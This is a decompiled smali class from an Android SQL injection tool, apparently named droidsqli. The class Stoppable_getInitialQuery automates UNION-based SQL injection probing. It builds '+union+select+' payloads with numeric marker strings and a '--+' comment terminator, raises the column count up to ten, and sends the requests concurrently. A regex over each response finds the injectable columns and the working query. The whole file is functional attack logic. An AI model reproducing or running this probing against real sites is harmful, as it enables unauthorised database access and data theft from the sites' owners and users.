.class Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInitialQuery;
.super Lnet/edgard/droidsqli/mvc/model/Stoppable;
.source "InjectionModel.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lnet/edgard/droidsqli/mvc/model/InjectionModel;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x2
    name = "Stoppable_getInitialQuery"
.end annotation


# instance fields
.field final synthetic this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;


# direct methods
.method public constructor <init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V
    .locals 0
    .param p2, "model"    # Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    .prologue
    .line 368
    iput-object p1, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInitialQuery;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    .line 369
    invoke-direct {p0, p2}, Lnet/edgard/droidsqli/mvc/model/Stoppable;-><init>(Lnet/edgard/droidsqli/mvc/model/InjectionModel;)V

    .line 370
    return-void
.end method


# virtual methods
.method public varargs action([Ljava/lang/Object;)Ljava/lang/String;
    .locals 13
    .param p1, "args"    # [Ljava/lang/Object;
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Lnet/edgard/droidsqli/exception/PreparationException;,
            Lnet/edgard/droidsqli/exception/StoppableException;
        }
    .end annotation

    .prologue
    .line 375
    invoke-static {}, Ljava/util/concurrent/Executors;->newCachedThreadPool()Ljava/util/concurrent/ExecutorService;

    move-result-object v7

    .line 376
    .local v7, "taskExecutor":Ljava/util/concurrent/ExecutorService;
    new-instance v6, Ljava/util/concurrent/ExecutorCompletionService;

    invoke-direct {v6, v7}, Ljava/util/concurrent/ExecutorCompletionService;-><init>(Ljava/util/concurrent/Executor;)V

    .line 378
    .local v6, "taskCompletionService":Ljava/util/concurrent/CompletionService;, "Ljava/util/concurrent/CompletionService<Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;>;"
    const/4 v3, 0x0

    .line 379
    .local v3, "requestFound":Z
    const-string v2, ""

    .line 385
    .local v2, "initialQuery":Ljava/lang/String;
    const/4 v5, 0x1

    .local v5, "selectIndex":I
    const-string v4, "133717330%2b1"

    .local v4, "selectFields":Ljava/lang/String;
    :goto_0
    const/16 v9, 0xa

    if-le v5, v9, :cond_1

    .line 388
    const/16 v8, 0xa

    .line 392
    .local v8, "total":I
    :goto_1
    if-nez v3, :cond_0

    const/16 v9, 0x63

    if-lt v8, v9, :cond_2

    .line 411
    :cond_0
    :try_start_0
    invoke-interface {v7}, Ljava/util/concurrent/ExecutorService;->shutdown()V

    .line 412
    const-wide/16 v9, 0xf

    sget-object v11, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    invoke-interface {v7, v9, v10, v11}, Ljava/util/concurrent/ExecutorService;->awaitTermination(JLjava/util/concurrent/TimeUnit;)Z
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/util/concurrent/ExecutionException; {:try_start_0 .. :try_end_0} :catch_1

    .line 419
    :goto_2
    if-eqz v3, :cond_5

    .line 420
    const-string v9, "\\+\\+union\\+select\\+.*?--\\+$"

    const-string v10, "+"

    invoke-virtual {v2, v9, v10}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    .line 421
    :goto_3
    return-object v9

    .line 386
    .end local v8    # "total":I
    :cond_1
    new-instance v9, Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;

    iget-object v10, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInitialQuery;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    new-instance v11, Ljava/lang/StringBuilder;

    iget-object v12, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInitialQuery;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v12, v12, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->insertionCharacter:Ljava/lang/String;

    invoke-static {v12}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v12, "+union+select+"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, "--+"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-direct {v9, v10, v11}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-interface {v6, v9}, Ljava/util/concurrent/CompletionService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;

    .line 385
    add-int/lit8 v5, v5, 0x1

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v10, ",1337"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "7330%2b1"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    goto :goto_0

    .line 395
    .restart local v8    # "total":I
    :cond_2
    :try_start_1
    invoke-virtual {p0}, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInitialQuery;->isPreparationStopped()Z

    move-result v9

    if-eqz v9, :cond_3

    new-instance v9, Lnet/edgard/droidsqli/exception/StoppableException;

    invoke-direct {v9}, Lnet/edgard/droidsqli/exception/StoppableException;-><init>()V

    throw v9
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0
    .catch Ljava/util/concurrent/ExecutionException; {:try_start_1 .. :try_end_1} :catch_1

    .line 413
    :catch_0
    move-exception v1

    .line 414
    .local v1, "e":Ljava/lang/InterruptedException;
    invoke-virtual {v1}, Ljava/lang/InterruptedException;->printStackTrace()V

    goto :goto_2

    .line 397
    .end local v1    # "e":Ljava/lang/InterruptedException;
    :cond_3
    :try_start_2
    invoke-interface {v6}, Ljava/util/concurrent/CompletionService;->take()Ljava/util/concurrent/Future;

    move-result-object v9

    invoke-interface {v9}, Ljava/util/concurrent/Future;->get()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;

    .line 399
    .local v0, "currentCallable":Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;
    const-string v9, ".*1337\\d+7331.*"

    const/16 v10, 0x20

    invoke-static {v9, v10}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v9

    iget-object v10, v0, Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;->content:Ljava/lang/String;

    invoke-virtual {v9, v10}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v9

    invoke-virtual {v9}, Ljava/util/regex/Matcher;->matches()Z

    move-result v9

    if-eqz v9, :cond_4

    .line 400
    iget-object v9, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInitialQuery;->model:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v10, v0, Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;->content:Ljava/lang/String;

    iput-object v10, v9, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->firstSuccessPageSource:Ljava/lang/String;

    .line 401
    iget-object v9, v0, Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;->url:Ljava/lang/String;

    const-string v10, "0%2b1"

    const-string v11, "1"

    invoke-virtual {v9, v10, v11}, Ljava/lang/String;->replaceAll(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 402
    const/4 v3, 0x1

    .line 404
    goto/16 :goto_1

    .line 405
    :cond_4
    add-int/lit8 v5, v5, 0x1

    .line 406
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v10

    invoke-direct {v9, v10}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v10, ",1337"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v9

    const-string v10, "7330%2b1"

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v9

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 407
    new-instance v9, Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;

    iget-object v10, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInitialQuery;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    new-instance v11, Ljava/lang/StringBuilder;

    iget-object v12, p0, Lnet/edgard/droidsqli/mvc/model/InjectionModel$Stoppable_getInitialQuery;->this$0:Lnet/edgard/droidsqli/mvc/model/InjectionModel;

    iget-object v12, v12, Lnet/edgard/droidsqli/mvc/model/InjectionModel;->insertionCharacter:Ljava/lang/String;

    invoke-static {v12}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v12, "+union+select+"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    const-string v12, "--+"

    invoke-virtual {v11, v12}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v11

    invoke-virtual {v11}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    invoke-direct {v9, v10, v11}, Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;-><init>(Lnet/edgard/droidsqli/mvc/model/ModelObservable;Ljava/lang/String;)V

    invoke-interface {v6, v9}, Ljava/util/concurrent/CompletionService;->submit(Ljava/util/concurrent/Callable;)Ljava/util/concurrent/Future;
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/util/concurrent/ExecutionException; {:try_start_2 .. :try_end_2} :catch_1

    .line 408
    add-int/lit8 v8, v8, 0x1

    goto/16 :goto_1

    .line 415
    .end local v0    # "currentCallable":Lnet/edgard/droidsqli/mvc/model/ModelObservable$MyCallable;
    :catch_1
    move-exception v1

    .line 416
    .local v1, "e":Ljava/util/concurrent/ExecutionException;
    invoke-virtual {v1}, Ljava/util/concurrent/ExecutionException;->printStackTrace()V

    goto/16 :goto_2

    .line 421
    .end local v1    # "e":Ljava/util/concurrent/ExecutionException;
    :cond_5
    const-string v9, ""

    goto/16 :goto_3
.end method
